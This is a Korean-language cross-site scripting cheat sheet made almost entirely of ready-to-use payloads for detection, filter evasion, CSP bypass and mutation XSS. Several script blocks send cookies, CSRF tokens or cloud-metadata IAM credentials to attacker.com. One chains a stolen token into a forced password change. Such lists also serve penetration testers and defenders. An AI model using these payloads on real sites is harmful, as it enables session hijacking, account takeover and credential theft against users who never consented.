# XSS (Cross-Site Scripting) — 페이로드 & 기법

## 기본 탐지
```html
<script>alert(1)</script>
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
'><script>alert(1)</script>
```

## Stored XSS — Cookie 탈취
```javascript
<script>
fetch('https://attacker.com/steal?c='+document.cookie)
</script>

<img src=x onerror="fetch('//attacker.com/?c='+btoa(document.cookie))">

<script>
var i=new Image();
i.src='//attacker.com/?c='+document.cookie;
</script>
```

## DOM XSS 소스/싱크
```javascript
// 위험한 소스
location.href / location.search / location.hash
document.referrer
window.name
document.URL

// 위험한 싱크
document.write()
document.innerHTML
eval()
setTimeout("...", 0)
location.href = "..."
$.html() / $.append()
```

## DOM XSS 페이로드
```javascript
// hash 기반
https://target.com/#<img src=x onerror=alert(1)>

// innerHTML 주입
"><img src=x onerror=alert(document.domain)>

// location.href 주입
javascript:alert(document.cookie)
```

## CSP 우회
```html
<!-- JSONP 엔드포인트 악용 -->
<script src="https://target.com/api?callback=alert(1)//"></script>

<!-- angular.js ng-app (strict: false) -->
{{constructor.constructor('alert(1)')()}}

<!-- base-uri 미설정 시 base 태그 -->
<base href="https://attacker.com/">

<!-- data: URI -->
<object data="data:text/html,<script>alert(1)</script>">
```

## 필터 우회
```html
<!-- 대소문자 -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x OnErRoR=alert(1)>

<!-- 이벤트 핸들러 다양화 -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<keygen autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>

<!-- 인코딩 -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
<img src=x onerror=\u0061lert(1)>

<!-- 공백 없이 -->
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>

<!-- 주석 삽입 -->
<scr/**/ipt>alert(1)</scr/**/ipt>

<!-- HTML5 신규 태그 -->
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<meter onmouseover=alert(1)>

<!-- template literal -->
`${alert(1)}`
```

## XSS to SSRF
```javascript
<script>
fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/', {credentials:'include'})
  .then(r=>r.text()).then(d=>fetch('//attacker.com/?d='+btoa(d)))
</script>
```

## XSS to 계정탈취
```javascript
// CSRF 토큰 추출 후 공격자 서버로 전송
<script>
fetch('/settings').then(r=>r.text()).then(html=>{
  let token = html.match(/csrf_token.*?value="(.*?)"/)[1];
  fetch('//attacker.com/?t='+token);
});
</script>

// 비밀번호 변경 요청 자동 전송
<script>
fetch('/change-password',{method:'POST',body:'new_pass=hacked&csrf=TOKEN',
  headers:{'Content-Type':'application/x-www-form-urlencoded'},credentials:'include'})
</script>
```

## XSS Hunter / Blind XSS
```javascript
// XSS Hunter 페이로드
"><script src=//xsshunter.com/p></script>
'><script src=//xsshunter.com/p></script>

// 자체 Blind XSS 수신
<script>
var x=new XMLHttpRequest();
x.open('GET','//attacker.com/?url='+location.href+'&cookie='+document.cookie);
x.send();
</script>
```

## mXSS (Mutation XSS)
```html
<!-- innerHTML 파싱 후 변형되는 케이스 -->
<listing>&lt;img src=x onerror=alert(1)&gt;</listing>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```
